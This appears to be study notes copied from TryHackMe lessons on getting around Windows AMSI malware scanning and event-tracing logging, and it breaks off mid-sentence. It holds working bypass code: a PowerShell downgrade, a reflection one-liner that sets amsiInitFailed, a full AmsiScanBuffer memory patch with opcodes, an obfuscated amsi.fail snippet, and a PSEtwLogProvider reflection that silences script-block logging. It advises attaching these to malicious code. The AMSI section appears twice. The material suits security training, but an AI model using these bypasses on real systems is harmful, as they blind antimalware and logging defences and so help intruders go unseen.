![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/efca9438e858f0476a4ffd777c36501a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/efca9438e858f0476a4ffd777c36501a.png)

Note: AMSI
 is only instrumented when loaded from memory when executed from the 
CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is 
already being instrumented.

Most of our research and known bypasses are placed in the Win32 API layer, manipulating the [AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) API call.

You may also notice the "Other Applications" interface from AMSI. Third-parties such as AV providers can instrument AMSI from their products. Microsoft documents [AMSI functions](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions) and the [AMSI stream interface](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream).

---

We can break down the code for AMSI
 PowerShell instrumentation to better understand how it is implemented 
and checks for suspicious content. To find where AMSI is instrumented, 
we can use [InsecurePowerShell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) maintained by [Cobbr](https://github.com/cobbr). InsecurePowerShell
 is a GitHub fork of PowerShell with security features removed; this 
means we can look through the compared commits and observe any security 
features. AMSI is only instrumented in twelve lines of code under `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs`. These twelve lines are shown below.

```cpp
var scriptExtent = scriptBlockAst.Extent;
 if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
 {
  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
  throw new ParseException(new[] { parseError });
 }

 if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
 {
  HasSuspiciousContent = true;
 }

```

---

We can take our knowledge of how AMSI is instrumented and research from others to create and use bypasses that abuse and evade AMSI or its utilities.

The way AMSI
 is instrumented can be complex, including multiple DLLs and varying 
execution strategies depending on where it is instrumented. By 
definition, AMSI is only an interface for other anti-malware products; 
AMSI will use multiple provider DLLs and API calls depending on what is 
being executed and at what layer it is being executed.

AMSI is instrumented from `System.Management.Automation.dll`, a .NET assembly developed by Windows; From
 the Microsoft docs, "Assemblies form the fundamental units of 
deployment, version control, reuse, activation scoping, and security 
permissions for .NET-based applications." The .NET assembly will instrument other DLLs and API
 calls depending on the interpreter and whether it is on disk or memory.
 The below diagram depicts how data is dissected as it flows through the
 layers and what DLLs/API calls are being instrumented.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/35e16d45ce27145fcdf231fdb8dcb35e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/35e16d45ce27145fcdf231fdb8dcb35e.png)

In the above graph data will begin flowing dependent on the interpreter used (PowerShell/VBScript/etc.)  Various API
 calls and interfaces will be instrumented as the data flows down the 
model at each layer. It is important to understand the complete model of
 AMSI, but we can break it down into core components, shown in the 
diagram below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/efca9438e858f0476a4ffd777c36501a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/efca9438e858f0476a4ffd777c36501a.png)

Note: AMSI
 is only instrumented when loaded from memory when executed from the 
CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is 
already being instrumented.

Most of our research and known bypasses are placed in the Win32 API layer, manipulating the [AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) API call.

You may also notice the "Other Applications" interface from AMSI. Third-parties such as AV providers can instrument AMSI from their products. Microsoft documents [AMSI functions](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions) and the [AMSI stream interface](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream).

---

We can break down the code for AMSI
 PowerShell instrumentation to better understand how it is implemented 
and checks for suspicious content. To find where AMSI is instrumented, 
we can use [InsecurePowerShell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) maintained by [Cobbr](https://github.com/cobbr). InsecurePowerShell
 is a GitHub fork of PowerShell with security features removed; this 
means we can look through the compared commits and observe any security 
features. AMSI is only instrumented in twelve lines of code under `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs`. These twelve lines are shown below.

```cpp
var scriptExtent = scriptBlockAst.Extent;
 if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
 {
  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
  throw new ParseException(new[] { parseError });
 }

 if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
 {
  HasSuspiciousContent = true;
 }

```

---

We can take our knowledge of how AMSI is instrumented and research from others to create and use bypasses that abuse and evade AMSI or its utilities.

**PowerShell Downgrade**

The PowerShell
 downgrade attack is a very low-hanging fruit that allows attackers to 
modify the current PowerShell version to remove security features.

Most PowerShell
 sessions will start with the most recent PowerShell engine, but 
attackers can manually change the version with a one-liner. By 
"downgrading" the PowerShell version to 2.0, you bypass security 
features since they were not implemented until version 5.0.

The attack only requires a one-liner to execute in our session. We can launch a new PowerShell process with the flags `-Version` to specify the version (2).

```powershell
PowerShell -Version 2
```

This attack can actively be seen exploited in tools such as [Unicorn](https://github.com/trustedsec/unicorn).

```powershell
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'

```

Since
 this attack is such low-hanging fruit and simple in technique, there 
are a plethora of ways for the blue team to detect and mitigate this 
attack.

The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.

**PowerShell Reflection**

Reflection allows a 
user or administrator to access and interact with .NET assemblies. From 
the Microsoft docs, "Assemblies form the fundamental units of 
deployment, version control, reuse, activation scoping, and security 
permissions for .NET-based applications." .NET assemblies may seem 
foreign; however, we can make them more familiar by knowing they take 
shape in familiar formats such as exe (**exe**cutable) and dll (**d**ynamic-**l**ink **l**ibrary).

PowerShell reflection can be abused to modify and identify information from valuable DLLs.

The AMSI utilities for PowerShell are stored in the `AMSIUtils` .NET assembly located in `System.Management.Automation.AmsiUtils`.

Matt Graeber published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

To explain the code functionality, we will break it down into smaller sections.

First, the snippet will call the reflection function and specify it wants to use an assembly from `[Ref.Assembly]` it will then obtain the type of the AMSI utility using `GetType`.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')

```

The
 information collected from the previous section will be forwarded to 
the next function to obtain a specified field within the assembly using `GetField`.

```powershell
.GetField('amsiInitFailed','NonPublic,Static')

```

The assembly and field information will then be forwarded to the next parameter to set the value from `$false` to `$true` using `SetValue`.

```powershell
.SetValue($null,$true)

```

Once the `amsiInitFailed` field is set to `$true`, AMSI will respond with the response code: AMSI_RESULT_NOT_DETECTED = 1

**Patching AMSI**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/03c0d034fc2d3c85b98520153b25790e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/03c0d034fc2d3c85b98520153b25790e.png)

AMSI is primarily instrumented and loaded from `amsi.dll`;
 this can be confirmed from the diagram we observed earlier. This dll 
can be abused and forced to point to a response code we want. The `AmsiScanBuffer` function provides us the hooks and functionality we need to access the pointer/buffer for the response code.

`AmsiScanBuffer` is vulnerable because `amsi.dll` is loaded into the PowerShell process at startup; our session has the same permission level as the utility.

`AmsiScanBuffer` will scan a "[buffer](https://en.wikipedia.org/wiki/Data_buffer)" of suspected code and report it to `amsi.dll`
 to determine the response. We can control this function and overwrite 
the buffer with a clean return code. To identify the buffer needed for 
the return code, we need to do some reverse engineering; luckily, this 
research and reverse engineering have already been done. We have the 
exact return code we need to obtain a clean response!

We will break down a code snippet modified by BC-Security and inspired by Tal Liberman; you can find the original code [here](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py). RastaMouse also has a similar bypass written in C# that uses the same technique; you can find the code [here](https://github.com/rasta-mouse/AmsiScanBufferBypass).

At a high-level AMSI patching can be broken up into four steps,

1. Obtain handle of `amsi.dll`
2. Get process address of `AmsiScanBuffer`
3. Modify memory protections of `AmsiScanBuffer`
4. Write opcodes to `AmsiScanBuffer`

We first need to load in any external libraries or API calls we want to utilize; we will load [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress), [GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea), and [VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) from **kernel32** using [p/invoke](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke).

```csharp
[DllImport(`"kernel32`")] // ImportDLL where API call is storedpublic static extern IntPtr GetProcAddress( //API Call to importIntPtr hModule, // Handle toDLL modulestring procName // function or variable to obtain
);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(
	string lpModuleName // Module to obtain handle
);

[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(
	IntPtr lpAddress, // Address of region to modify
	UIntPtr dwSize, // Size of region
	uint flNewProtect, // Memory protection options
	out uint lpflOldProtect // Pointer to store previous protection options
);
```

The functions are now defined, but we need to load the API calls using `Add-Type`. This cmdlet will load the functions with a proper type and namespace that will allow the functions to be called.

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;

```

Now that we can call our API functions, we can identify where `amsi.dll` is located and how to get to the function. First, we need to identify the process handle of AMSI using `GetModuleHandle`. The handle will then be used to identify the process address of `AmsiScanBuffer` using `GetProcAddress`.

```csharp
$handle = [Win32.Kernel32]::GetModuleHandle(
	'amsi.dll' // Obtains handle to amsi.dll
);
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
	$handle, // Handle of amsi.dll
	'AmsiScanBuffer' //API call to obtain);
```

Next, we need to modify the memory protection of the `AmsiScanBuffer` process region. We can specify parameters and the buffer address for `VirtualProtect`.

Information on the parameters and their values can be found from the previously mentioned API documentation.

```csharp
[UInt32]$Size = 0x5; // Size of region
[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options
[Win32.Kernel32]::VirtualProtect(
	$BufferAddress, // Point to AmsiScanBuffer
	$Size, // Size of region
	$ProtectFlag, // Enables R or RW access to region
	[Ref]$OldProtectFlag // Pointer to store old options
);
```

We need to specify what we want to overwrite the buffer with; the process to identify this buffer can be found [here](https://rastamouse.me/memory-patching-amsi-bypass/). Once the buffer is specified, we can use [marshal copy](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0) to write to the process.

```csharp
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy(
	$buf, // Opcodes/array to write
	0, // Where to start copying in source array
	$BufferAddress, // Where to write (AsmiScanBuffer)
	6 // Number of elements/opcodes to write
);
```

At this stage, we should have an AMSI
 bypass that works! It should be noted that with most tooling, 
signatures and detections can and are crafted to detect this script.

**Automating for Fun and Profit**

While it is preferred to use the previous methods shown in this room, attackers can use other automated tools to break AMSI signatures or compile a bypass.

The first automation tool we will look at is [amsi.fail](http://amsi.fail/)

[amsi.fail](http://amsi.fail/) will compile and generate a PowerShell
 bypass from a collection of known bypasses. From amsi.fail, "AMSI.fail 
generates obfuscated PowerShell snippets that break or disable AMSI for 
the current process. The snippets are randomly selected from a small 
pool of techniques/variations before obfuscating. Every snippet is 
obfuscated at runtime/request so that no generated output share the same
 signatures."

Below is an example of an obfuscated PowerShell snippet from amsi.fail

```powershell
$d=$null;$qcgcjblv=[$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).Runtime.InteropServices.Marshal]::AllocHGlobal((9076+7561-7561));$pkgzwpahfwntq="+('lwbj'+'cymh').NORmaliZe([CHar]([byTe]0x46)+[char](111)+[ChAR]([ByTE]0x72)+[chaR](109*73/73)+[ChAR]([ByTE]0x44)) -replace [char]([bytE]0x5c)+[Char](112*106/106)+[char]([bYte]0x7b)+[chAR]([BYtE]0x4d)+[CHAR](110+8-8)+[CHAr]([BytE]0x7d)";[Threading.Thread]::Sleep(1595);[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$(('àmsí'+'Sess'+'íón').norMALiZE([CHaR](70*49/49)+[chAr](87+24)+[ChaR]([bytE]0x72)+[chAr](109)+[chAR](68+43-43)) -replace [CHAr](92)+[chAr]([byTe]0x70)+[CHAr]([bYTE]0x7b)+[cHAr](77*71/71)+[CHar]([bYtE]0x6e)+[char](125+49-49))", "NonPublic,Static").SetValue($d, $null);[Ref].Assembly.GetType("$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[ChAR]([bYtE]0x6d)+[chaR](68*10/10)) -replace [cHAR](92)+[char]([ByTE]0x70)+[cHar]([bYtE]0x7b)+[Char](69+8)+[ChAr]([bYTE]0x6e)+[ChaR]([BYtE]0x7d)).$(('Mãnâge'+'ment').NOrMalIzE([ChaR](70)+[chAR](111*105/105)+[cHAR](114+29-29)+[chaR]([bYtE]0x6d)+[CHAR](22+46)) -replace [cHar]([BytE]0x5c)+[CHar](112*11/11)+[chAR](123+34-34)+[CHAR](77*13/13)+[cHaR]([bYTe]0x6e)+[cHAR]([bYte]0x7d)).$(('Àutõmâtî'+'ôn').NoRMAlIZe([CHar]([bYTE]0x46)+[Char]([byte]0x6f)+[cHAR]([BYtE]0x72)+[cHAR](109+105-105)+[ChAr](68*28/28)) -replace [chAR]([BytE]0x5c)+[cHAr]([BYTE]0x70)+[CHAR]([BytE]0x7b)+[char]([byte]0x4d)+[CHaR]([BYte]0x6e)+[chaR](125+23-23)).$([CHAR]([ByTe]0x41)+[CHAr]([bYtE]0x6d)+[chaR](115*46/46)+[cHar]([BYTe]0x69)+[cHaR](85)+[CHAr](116)+[chAr](105*44/44)+[cHAr](108*64/64)+[chAr]([BYte]0x73))").GetField("$([chAR]([byTe]0x61)+[Char](109+52-52)+[cHar](46+69)+[CHar]([byTe]0x69)+[CHAR]([BYTe]0x43)+[Char]([ByTe]0x6f)+[chAR](110)+[chaR](116*47/47)+[cHar](101)+[CHAR]([bYte]0x78)+[CHaR]([ByTE]0x74))", "NonPublic,Static").SetValue($null, [IntPtr]$qcgcjblv);

```

You can attach this bypass at the beginning of your malicious code as
 with previous bypasses or run it in the same session before executing 
malicious code.

---

[AMSITrigger](https://github.com/RythmStick/AMSITrigger)
 allows attackers to automatically identify strings that are flagging 
signatures to modify and break them. This method of bypassing AMSI is more consistent than others because you are making the file itself clean.

The syntax for using amsitrigger is relatively straightforward; you 
need to specify the file or URL and what format to scan the file. Below 
is an example of running amsitrigger.

AMSI Trigger Example

```html
C:\Users\Tryhackme\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer');
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

Signatures are highlighted in red; you can break these signatures by encoding, obfuscating, etc.

**EVADING LOGGING AND MONITORING**

**Event Tracing**

As previously 
mentioned, almost all event logging capability within Windows is handled
 from ETW at both the application and kernel level. While there are 
other services in place like *Event Logging* and *Trace Logging,* these are either extensions of ETW or less prevalent to attackers.

| **Component** | **Purpose** |
| --- | --- |
| Controllers | Build and configure sessions |
| Providers | Generate events |
| Consumers | Interpret events |

We will cover each component and how it is instrumented in more depth in the next task.

---

While
 less important to an attacker than components, event IDs are a core 
feature of Windows logging. Events are sent and transferred in 
XML(Extensible Markup Language) format which is the standard for how 
events are defined and implemented by providers. Below is an example of 
event ID 4624: *An account was successfully logged on*.

```jsx
Event ID:4624
Source:Security
Category:Logon/Logoff
Message:An account was successfully logged on.

Subject:
Security ID: NT AUTHORITY\\SYSTEM
Account Name: WORKSTATION123$
...
[ snip ]
...
Logon Type: 7

New Logon:
Security ID: CORPDOMAIN\\john.doe
Account Name: john.doe
...
[ snip ]
...
Process Information:
Process ID: 0x314

```

For more information about event logging, check out the [Windows Event Logs room](https://tryhackme.com/room/windowseventlogs).

---

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/db1b84e4a474da69a73f6678fe04858e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/db1b84e4a474da69a73f6678fe04858e.png)

At this point, we understand why logging can disrupt an attacker, but how exactly is ETW relevant to an attacker? ETW has visibility over a majority of the operating system, whereas logging generally has limited visibility or detail.

Due to the visibility of ETW, an attacker should always be mindful of
 the events that could be generated when carrying out their operation. 
The best approach to taking down ETW is to limit its insight as much as 
possible into specifically what you are doing while maintaining 
environment integrity.

In the upcoming tasks, we will cover ETW instrumentation, ETW evasion, and other ETW-based solutions.

**Approaches to Log Evasion**

Before diving deep into
 the more modern and technical evasion techniques, let’s look at the 
various approaches available and their impacts on attackers and 
defenders.

When first thinking about and assessing log evasion, 
you may think that simply destroying or tampering with the logs may be 
viable.

Following security best practices, it is typical for
 a modern environment to employ log forwarding. Log forwarding means 
that the SOC
 will move or “forward” logs from the host machine to a central server 
or indexer. Even if an attacker can delete logs from the host machine, 
they could already be off of the device and secured.

Assuming an attacker did destroy all of the logs before they were
 forwarded, or if they were not forwarded, how would this raise an 
alert? An attacker must first consider environment integrity; if no logs
 originate from a device, that can present serious suspicion and lead to
 an investigation. Even if an attacker did control what logs were 
removed and forwarded, defenders could still track the tampering.

| **Event ID** | **Purpose** |
| --- | --- |
| 1102 | Logs when the Windows Security audit log was cleared |
| 104 | Logs when the log file was cleared |
| 1100 | Logs when the Windows Event Log service was shut down |

The
 above event IDs can monitor the process of destroying logs or “log 
smashing.” This poses a clear risk to attackers attempting to tamper 
with or destroy logs. Although it is possible to bypass these 
mitigations further or tamper with the logs, an attacker must assess the
 risk. When approaching an environment, you are generally unaware of 
security practices and take an **OPSEC** (**Op**erational **Sec**urity) risk by attempting this approach.

If the previous approach is too aggressive, how can we strategically approach the problem?

An
 attacker must focus on what logs a malicious technique may result in to
 keep an environment's integrity intact. Knowing what may be 
instrumented against them, they can utilize or modify published methods.

Most
 published techniques will target ETW components since that will allow 
an attacker the most control over the tracing process.

This room will break down some of the most common published 
techniques and a more modern technique that allows for a wide range of 
control.

**Tracing Instrumentation**

ETW is broken up 
into three separate components, working together to manage and correlate
 data. Event logs in Windows are no different from generic XML data, making it easy to process and interpret.

Event
 Controllers are used to build and configure sessions. To expand on this
 definition, we can think of the controller as the application that 
determines how and where data will flow. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#controllers),
 “Controllers are applications that define the size and location of the 
log file, start and stop event tracing sessions, enable providers so 
they can log events to the session, manage the size of the buffer pool, 
and obtain execution statistics for sessions.”

Event Providers are
 used to generate events. To expand on this definition, the controller 
will tell the provider how to operate, then collect logs from its 
designated source. From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#providers),
 “Providers are applications that contain event tracing instrumentation.
 After a provider registers itself, a controller can then enable or 
disable event tracing in the provider. The provider defines its 
interpretation of being enabled or disabled. Generally, an enabled 
provider generates events, while a disabled provider does not.”

There are also four different types of providers with support for various functions and legacy systems.

| **Provider** | **Purpose** |
| --- | --- |
| **MOF** (**M**anaged **O**bject **F**ormat) | Defines events from MOF classes. Enabled by one trace session at a time. |
| **WPP** (**W**indows Software Trace **P**re**p**rocessor) | Associated with [TMF(Trace Message Format)](https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/trace-message-format-file) files to decode information. Enabled by one trace session at a time. |
| Manifest-Based | Defines events from a manifest. Enabled by up to eight trace sessions at a time. |
| TraceLogging | Self-describing events containing all required information. Enabled by up to eight trace sessions at a time. |

Event
 Consumers are used to interpret events. To expand on this definition, 
the consumer will select sessions and parse events from that session or 
multiple at the same time. This is most commonly seen in the “*Event Viewer”.* From the [Microsoft docs](https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing#consumers),
 “Consumers are applications that select one or more event tracing 
sessions as a source of events. A consumer can request events from 
multiple event tracing sessions simultaneously; the system delivers the 
events in chronological order. Consumers can receive events stored in 
log files, or from sessions that deliver events in real time.”

Each of these components can be brought together to fully understand and depict the data/session flow within ETW.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/dc8217f5aecbcc08d609c3299756da08.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/dc8217f5aecbcc08d609c3299756da08.png)

From
 start to finish, events originate from the providers. Controllers will 
determine where the data is sent and how it is processed through 
sessions. Consumers will save or deliver logs to be interpreted or 
analyzed.

Now that we understand how ETW is instrumented, how does this 
apply to attackers? We previously mentioned the goal of limiting 
visibility while maintaining integrity. We can limit a specific aspect 
of insight by targeting components while maintaining most of the data 
flow. Below is a brief list of specific techniques that target each ETW 
component.

| **Component** | **Techniques** |
| --- | --- |
| Provider | PSEtwLogProvider Modification, Group Policy Takeover, Log Pipeline Abuse, Type Creation |
| Controller | Patching EtwEventWrite, Runtime Tracing Tampering, |
| Consumers | Log Smashing, Log Tampering |

We will cover each of these techniques in-depth in the upcoming tasks to provide a large toolbox of possibilities.

**Reflection for Fun and Silence**

Within PowerShell, ETW providers are loaded into the session from a **.NET assembly**: `PSEtwLogProvider`. From the [Microsoft docs](https://docs.microsoft.com/en-us/dotnet/standard/assembly/),
 "Assemblies form the fundamental units of deployment, version control, 
reuse, activation scoping, and security permissions for .NET-based 
applications." .NET assemblies may seem 
foreign; however, we can make them more familiar by knowing they take 
shape in familiar formats such as an exe (**exe**cutable) or a dll (**d**ynamic-**l**ink **l**ibrary).

In a PowerShell
 session, most .NET assemblies are loaded in the same security context 
as the user at startup. Since the session has the same privilege level 
as the loaded assemblies, we can modify the assembly fields and values 
through PowerShell reflection. From [O'Reilly](https://www.oreilly.com/library/view/professional-windows-powershell/9780471946939/9780471946939_using_.net_reflection.html)
, "Reflection allows you to look inside an assembly and find out its 
characteristics. Inside a .NET assembly, information is stored that 
describes what the assembly contains. This is called metadata. A .NET 
assembly is, in a sense, self-describing, at least if interrogated 
correctly."

In the context of **ETW** (**E**vent **T**racing for **W**indows), an attacker can reflect the ETW event provider assembly and set the field `m_enabled` to `$null`.

At a high level, PowerShell reflection can be broken up into four steps:

1. Obtain .NET assembly for `PSEtwLogProvider`.
2. Store a null value for `etwProvider` field.
3. Set the field for `m_enabled` to previously stored value.

At step one, we need to obtain the type for the `PSEtwLogProvider` assembly. The assembly is stored in order to access its internal fields in the next step.

```powershell
$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

```

At step two, we are storing a value ($null) from the previous assembly to be used.

```powershell
$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

```

At step three, we compile our steps together to overwrite the `m_enabled` field with the value stored in the previous line.

```powershell
[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);

```

We can compile these steps together and append them to a malicious PowerShell script. Use the PowerShell script provided and experiment with this technique.

To prove the efficacy of the script, we can execute it and measure the number of returned events from a given command.

Before

```powershell
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
7
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
11
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/67a61f5e3f05f5ce34c457509712adba.PNG](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/67a61f5e3f05f5ce34c457509712adba.PNG)

After

```powershell
PS C:\Users\Administrator>.\reflection.ps1
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
PS C:\Users\Administrator> whoami
Tryhackme\administrator
PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-PowerShell"; Id=4104} | Measure | % Count
18
```

In the first terminal, we see four events generated when the whoami command is run. After the script is executed in the second terminal, we see no events generated from running a command. From this comparison, we can also see that the PowerShell script creates seven events; this should be considered when evaluating an approach.

**Patching Tracing Functions**

ETW is loaded from the runtime of every new process, commonly originating from the **CLR** (**C**ommon **L**anguage **R**untime).
 Within a new process, ETW events are sent from the userland and issued 
directly from the current process. An attacker can write pre-defined 
opcodes to an in-memory function of ETW to patch and disable 
functionality. Before diving into the specific details of this 
technique, let’s observe what patching may look like at a high level. At
 its most basic definition, we are trying to force an application to 
quit or return before reaching the function we want to patch.

To better understand this concept, we created a basic pseudo function
 that will perform math operations and then return an integer. If a 
return is inserted before the original return then the program will not 
complete the subsequent lines.

```csharp
int x = 1
int y = 3
return x + y

// output: 4
```

```csharp
int x = 1
return  x
int y = 3
return x + y

// output: 1
```

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/fd799172fc4bcea01ddf4b59ecaa4ca3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/fd799172fc4bcea01ddf4b59ecaa4ca3.png)

Adapting this high-level concept to our objective, if we can identify
 how the return is called in memory we can write it to the function and 
expect it to run before any other lines. We are expecting that the 
return is placed at the top because the stack uses a **LIFO** (**L**ast **I**n **F**irst **O**ut)
 structure. To the right is a brief diagram of how the LIFO structure 
works. We will expand on how the LIFO structure operates as we dive 
deeper into this task.

Now that we understand a little more about 
the return statements and the LIFO structure, let’s return to how this 
applies to event tracing. Before writing any code or identifying steps 
to patch a function, we need to identify a malicious function and 
possible points that we can return from. Thanks to previous research, we
 know that from the CLR, ETW is written from the function `EtwEventWrite`. To identify “patch points” or returns, we can view the disassembly of the function.

```wasm
779f2459 33cc		       xor	ecx, esp
779f245b e8501a0100	   call	ntdll!_security_check_cookie
779f2460 8be5		       mov	esp, ebp
779f2462 5d		         pop	ebp
779f2463 c21400		     ret	14h
```

When
